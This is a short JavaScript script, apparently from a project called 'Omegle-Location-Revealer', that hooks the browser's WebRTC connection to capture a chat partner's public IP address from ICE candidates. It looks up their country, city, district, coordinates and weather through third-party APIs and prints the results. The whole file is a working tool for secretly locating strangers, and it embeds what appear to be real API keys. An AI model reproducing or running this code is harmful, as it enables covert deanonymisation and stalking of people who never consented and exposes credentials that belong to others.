/// Alexbieber <hackthetrack1234@gmail.com.com>
/// https://github.com/alexbieber/Omegle-Location-Revealer
/// Created the 04/05/2022

// the API key allowing to know the location of someone thanks to an IP : https://ipgeolocation.io
let keyapi = "8d3373cc74884e1d8cf43a792b1da3b5";
//api id for weather api
let apiid = "13e9a17994b20147058d3a408c876005";

window.oRTCPeerConnection =
    window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
    const pc = new window.oRTCPeerConnection(...args);

    pc.oaddIceCandidate = pc.addIceCandidate;

    pc.addIceCandidate = function (iceCandidate, ...rest) {
        const fields = iceCandidate.candidate.split(" ");

        console.log(iceCandidate.candidate);
        const ip = fields[4];
        if (fields[7] === "srflx") {
            getLocation(ip);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
    };
    return pc;
};
// Use the API to be able to locate the person thanks to an IP :)
let getLocation = async (ip) => {
    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${keyapi}&ip=${ip}`;
    let output = "";

    await fetch(url).then((response) =>
        response.json().then((json) => {
            output = `
-------------------------------
IP: ${ip}
Country: ${json.country_name}
State: ${json.state_prov}
City: ${json.city}
District: ${json.district}
Lat / Long: (${json.latitude}, ${json.longitude})
`;
            getWeather(json.city).then((weather) => {
                output += `Temperature: ${weather.temp}°C \n`;
                output += `Weather: ${weather.weather} \n`;
                output += `-------------------------------\nby AlexBieber :)`;
                console.log(output);
            });
        })
    );
};

//Weather API added to get the weather information of the user which will gives the temperature in °C of perticular city.
let getWeather = async (city) => {
    let url = `https://api.openweathermap.org/data/2.5/weather?q=${city}&appid=${apiid}&units=metric`;
    let weather = {};

    await fetch(url).then((response) =>
        response.json().then((json) => {
            weather.temp = json.main.temp;
            weather.weather = json.weather[0].main;
        })
    );

    return weather;
};
